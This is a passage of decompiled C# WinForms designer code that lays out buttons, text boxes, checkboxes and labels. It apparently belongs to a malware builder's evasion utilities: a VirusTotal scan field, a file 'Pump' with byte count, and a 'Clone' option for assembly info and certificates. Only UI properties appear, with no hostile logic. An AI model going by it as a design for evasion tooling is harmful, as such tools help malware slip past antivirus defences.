        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.metroSetButton3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton3).Location = new System.Drawing.Point(485, 417);
        ((System.Windows.Forms.Control)this.metroSetButton3).Name = "metroSetButton3";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton3).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetButton3).TabIndex = 154;
        ((System.Windows.Forms.Control)this.metroSetButton3).Text = "Start";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.metroSetButton3).Click += new System.EventHandler(metroSetButton3_Click);
        ((GuiLib.AnimaTextBox)this.virusTotalKey).Dark = false;
        ((System.Windows.Forms.Control)this.virusTotalKey).Location = new System.Drawing.Point(299, 388);
        ((GuiLib.AnimaTextBox)this.virusTotalKey).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.virusTotalKey).MultiLine = false;
        ((System.Windows.Forms.Control)this.virusTotalKey).Name = "virusTotalKey";
        ((GuiLib.AnimaTextBox)this.virusTotalKey).Numeric = false;
        ((GuiLib.AnimaTextBox)this.virusTotalKey).ReadOnly = false;
        ((System.Windows.Forms.Control)this.virusTotalKey).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.virusTotalKey).TabIndex = 153;
        ((GuiLib.AnimaTextBox)this.virusTotalKey).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label47).AutoSize = true;
        ((System.Windows.Forms.Control)this.label47).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label47).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label47).Location = new System.Drawing.Point(299, 370);
        ((System.Windows.Forms.Control)this.label47).Name = "label47";
        ((System.Windows.Forms.Control)this.label47).Size = new System.Drawing.Size(67, 15);
        ((System.Windows.Forms.Control)this.label47).TabIndex = 152;
        ((System.Windows.Forms.Control)this.label47).Text = "VT API Key:";
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Location = new System.Drawing.Point(743, 342);
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Name = "openVirusTotalFile";
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).StyleManager = null;
        ((System.Windows.Forms.Control)this.openVirusTotalFile).TabIndex = 151;
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Text = "Open";
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.openVirusTotalFile).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.openVirusTotalFile).Click += new System.EventHandler(openVirusTotalFile_Click);
        ((GuiLib.AnimaTextBox)this.virustotalFile).Dark = false;
        ((System.Windows.Forms.Control)this.virustotalFile).Location = new System.Drawing.Point(299, 342);
        ((GuiLib.AnimaTextBox)this.virustotalFile).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.virustotalFile).MultiLine = false;
        ((System.Windows.Forms.Control)this.virustotalFile).Name = "virustotalFile";
        ((GuiLib.AnimaTextBox)this.virustotalFile).Numeric = false;
        ((GuiLib.AnimaTextBox)this.virustotalFile).ReadOnly = true;
        ((System.Windows.Forms.Control)this.virustotalFile).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.virustotalFile).TabIndex = 150;
        ((GuiLib.AnimaTextBox)this.virustotalFile).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label48).AutoSize = true;
        ((System.Windows.Forms.Control)this.label48).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label48).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label48).Location = new System.Drawing.Point(299, 324);
        ((System.Windows.Forms.Control)this.label48).Name = "label48";
        ((System.Windows.Forms.Control)this.label48).Size = new System.Drawing.Size(55, 15);
        ((System.Windows.Forms.Control)this.label48).TabIndex = 149;
        ((System.Windows.Forms.Control)this.label48).Text = "File path:";
        ((System.Windows.Forms.Control)this.metroSetDivider19).Location = new System.Drawing.Point(-57, 310);
        ((System.Windows.Forms.Control)this.metroSetDivider19).Name = "metroSetDivider19";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider19).Size = new System.Drawing.Size(1239, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider19).TabIndex = 148;
        ((System.Windows.Forms.Control)this.metroSetDivider19).Text = "metroSetDivider19";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider19).Thickness = 1;
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.pumpBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.pumpBtn).Location = new System.Drawing.Point(485, 280);
        ((System.Windows.Forms.Control)this.pumpBtn).Name = "pumpBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.pumpBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.pumpBtn).TabIndex = 147;
        ((System.Windows.Forms.Control)this.pumpBtn).Text = "Pump";
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.pumpBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.pumpBtn).Click += new System.EventHandler(pumpBtn_Click);
        ((GuiLib.AnimaTextBox)this.bytesCount).Dark = false;
        ((System.Windows.Forms.Control)this.bytesCount).Location = new System.Drawing.Point(299, 251);
        ((GuiLib.AnimaTextBox)this.bytesCount).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.bytesCount).MultiLine = false;
        ((System.Windows.Forms.Control)this.bytesCount).Name = "bytesCount";
        ((GuiLib.AnimaTextBox)this.bytesCount).Numeric = false;
        ((GuiLib.AnimaTextBox)this.bytesCount).ReadOnly = false;
        ((System.Windows.Forms.Control)this.bytesCount).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.bytesCount).TabIndex = 146;
        ((GuiLib.AnimaTextBox)this.bytesCount).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.bytesCountLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.bytesCountLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.bytesCountLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.bytesCountLbl).Location = new System.Drawing.Point(299, 233);
        ((System.Windows.Forms.Control)this.bytesCountLbl).Name = "bytesCountLbl";
        ((System.Windows.Forms.Control)this.bytesCountLbl).Size = new System.Drawing.Size(72, 15);
        ((System.Windows.Forms.Control)this.bytesCountLbl).TabIndex = 145;
        ((System.Windows.Forms.Control)this.bytesCountLbl).Text = "Bytes count:";
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.openPumpBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openPumpBtn).Location = new System.Drawing.Point(743, 205);
        ((System.Windows.Forms.Control)this.openPumpBtn).Name = "openPumpBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openPumpBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.openPumpBtn).TabIndex = 144;
        ((System.Windows.Forms.Control)this.openPumpBtn).Text = "Open";
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.openPumpBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.openPumpBtn).Click += new System.EventHandler(openPumpBtn_Click);
        ((GuiLib.AnimaTextBox)this.pumpPath).Dark = false;
        ((System.Windows.Forms.Control)this.pumpPath).Location = new System.Drawing.Point(299, 205);
        ((GuiLib.AnimaTextBox)this.pumpPath).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.pumpPath).MultiLine = false;
        ((System.Windows.Forms.Control)this.pumpPath).Name = "pumpPath";
        ((GuiLib.AnimaTextBox)this.pumpPath).Numeric = false;
        ((GuiLib.AnimaTextBox)this.pumpPath).ReadOnly = true;
        ((System.Windows.Forms.Control)this.pumpPath).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.pumpPath).TabIndex = 143;
        ((GuiLib.AnimaTextBox)this.pumpPath).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.pumpPathLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.pumpPathLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.pumpPathLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.pumpPathLbl).Location = new System.Drawing.Point(299, 187);
        ((System.Windows.Forms.Control)this.pumpPathLbl).Name = "pumpPathLbl";
        ((System.Windows.Forms.Control)this.pumpPathLbl).Size = new System.Drawing.Size(71, 15);
        ((System.Windows.Forms.Control)this.pumpPathLbl).TabIndex = 142;
        ((System.Windows.Forms.Control)this.pumpPathLbl).Text = "Target path:";
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.cloneBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.cloneBtn).Location = new System.Drawing.Point(485, 146);
        ((System.Windows.Forms.Control)this.cloneBtn).Name = "cloneBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.cloneBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.cloneBtn).TabIndex = 141;
        ((System.Windows.Forms.Control)this.cloneBtn).Text = "Clone";
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.cloneBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.cloneBtn).Click += new System.EventHandler(cloneBtn_Click);
        ((System.Windows.Forms.Control)this.certificate).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.certificate).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.certificate).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.certificate).Location = new System.Drawing.Point(718, 107);
        ((System.Windows.Forms.Control)this.certificate).Name = "certificate";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.certificate).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).StyleManager = null;
        ((System.Windows.Forms.Control)this.certificate).TabIndex = 140;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.certificate).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.certificateLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.certificateLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.certificateLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.certificateLbl).Location = new System.Drawing.Point(625, 107);
        ((System.Windows.Forms.Control)this.certificateLbl).Name = "certificateLbl";
        ((System.Windows.Forms.Control)this.certificateLbl).Size = new System.Drawing.Size(64, 15);
        ((System.Windows.Forms.Control)this.certificateLbl).TabIndex = 139;
        ((System.Windows.Forms.Control)this.certificateLbl).Text = "Certificate:";
        ((System.Windows.Forms.Control)this.assemblyInfo).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.assemblyInfo).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.assemblyInfo).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.assemblyInfo).Location = new System.Drawing.Point(390, 107);
        ((System.Windows.Forms.Control)this.assemblyInfo).Name = "assemblyInfo";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.assemblyInfo).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).StyleManager = null;
        ((System.Windows.Forms.Control)this.assemblyInfo).TabIndex = 138;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.assemblyInfo).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).Location = new System.Drawing.Point(299, 107);
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).Name = "assemblyInfoLbl";
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).Size = new System.Drawing.Size(85, 15);
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).TabIndex = 137;
        ((System.Windows.Forms.Control)this.assemblyInfoLbl).Text = "Assembly Info:";
        ((System.Windows.Forms.Control)this.metroSetDivider13).Location = new System.Drawing.Point(-57, 175);
        ((System.Windows.Forms.Control)this.metroSetDivider13).Name = "metroSetDivider13";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider13).Size = new System.Drawing.Size(1282, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider13).TabIndex = 136;
        ((System.Windows.Forms.Control)this.metroSetDivider13).Text = "metroSetDivider13";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider13).Thickness = 1;
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.openBuildBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openBuildBtn).Location = new System.Drawing.Point(743, 71);
        ((System.Windows.Forms.Control)this.openBuildBtn).Name = "openBuildBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openBuildBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.openBuildBtn).TabIndex = 135;
        ((System.Windows.Forms.Control)this.openBuildBtn).Text = "Open";
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.openBuildBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.openBuildBtn).Click += new System.EventHandler(openBuildBtn_Click);
        ((GuiLib.AnimaTextBox)this.buildPathTb).Dark = false;
        ((System.Windows.Forms.Control)this.buildPathTb).Location = new System.Drawing.Point(299, 71);
        ((GuiLib.AnimaTextBox)this.buildPathTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.buildPathTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.buildPathTb).Name = "buildPathTb";
        ((GuiLib.AnimaTextBox)this.buildPathTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.buildPathTb).ReadOnly = true;
        ((System.Windows.Forms.Control)this.buildPathTb).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.buildPathTb).TabIndex = 134;
        ((GuiLib.AnimaTextBox)this.buildPathTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.buildPathLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.buildPathLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.buildPathLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.buildPathLbl).Location = new System.Drawing.Point(299, 53);
